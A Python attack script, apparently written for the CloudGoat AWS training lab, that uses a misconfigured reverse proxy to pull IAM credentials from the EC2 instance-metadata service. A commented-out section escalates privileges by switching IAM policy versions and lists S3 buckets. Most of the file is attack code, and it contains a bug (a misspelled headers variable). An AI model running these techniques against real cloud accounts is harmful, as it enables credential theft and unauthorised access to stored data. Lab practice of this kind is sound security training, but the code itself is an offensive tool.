import boto3
import json
import requests

# This script will get high privileged EC2 instance credentials via reverse proxy vulnerability
# Then sensitive date will be obtained from s3 buckets using the high privileged credentials
# As the result it will invoke the lamda funcition to indicate the success of the attack
# https://resources.infosecinstitute.com/topic/cloudgoat-walkthrough-series-cloud-breach-s3/







# Load various credentials from .secure/credentials.json
with open('.secure/credentials.json', 'r') as file:
    credentials = json.load(file)
credentials_profile='scenario2'

access_key_id=credentials[credentials_profile]['aws_access_key_id']
secret_access_key=credentials[credentials_profile]['aws_secret_access_key']
region=credentials[credentials_profile]['region']
lambda_function_name=credentials[credentials_profile]['lambda_function_name']
reverse_proxy_ip=credentials[credentials_profile]['reverse_proxy_ip']

proxy_url = 'http://' + reverse_proxy_ip + '/latest/meta-data/iam/security-credentials'
proxt_headers = {'Host': '169.254.169.254'}

response = requests.get(proxy_url, headers=headers)

if response.status_code == 200:
    security_credentials = response.text
    print(security_credentials)
else:
    print('Error:', response.status_code)

# iam = boto3.client(
#     'iam',
#     aws_access_key_id=access_key_id,
#     aws_secret_access_key=secret_access_key
# )

# response = iam.list_attached_user_policies( UserName=iamuser)

# # Obtain the policy arn of the first policy attached to the user
# PolicyArn = response['AttachedPolicies'][0]['PolicyArn']
# print ('INFO:Vulnerable policy detected PolicyArn:', PolicyArn)
# response = iam.list_policy_versions( PolicyArn=PolicyArn)

# VersionDefaultId = ''
# VersionFound = False
# Version2Enable = ''

# for Version in response['Versions']:
#     if Version['IsDefaultVersion'] == True:
#         VersionDefaultId = Version['VersionId']
#         print('INFO:Version', VersionDefaultId ,'is detected as the default version of the policy', PolicyArn)
#     for Statement in iam.get_policy_version(PolicyArn=PolicyArn, VersionId=Version['VersionId'])['PolicyVersion']['Document']['Statement']:
#         if Statement['Action'] == 's3:ListAllMyBuckets' and Statement['Resource'] == '*' and Statement['Effect'] == 'Allow':
#             VersionFound=True
#             Version2Enable=Version['VersionId']
#             print('SUCCESS: Version', Version2Enable ,'is detected as the PRIVILIGED version of the policy', PolicyArn)
            
# if VersionFound == True:
#      iam.set_default_policy_version(PolicyArn=PolicyArn, VersionId=Version2Enable)
#      print('==========>Version', Version2Enable ,'is temporarily established as default version')
#      print ('<==========List of S3 buckets:')

#      s3 = boto3.client(
#         's3',
#         aws_access_key_id=access_key_id,
#         aws_secret_access_key=secret_access_key)
#      for bucketname in s3.list_buckets()['Buckets']:
#          print(bucketname['Name'])

#      print('==========>Version', VersionDefaultId ,'is restored back as default.')
#      iam.set_default_policy_version(PolicyArn=PolicyArn, VersionId=VersionDefaultId)

# else:
#     print('No Version found with the correct permissions')
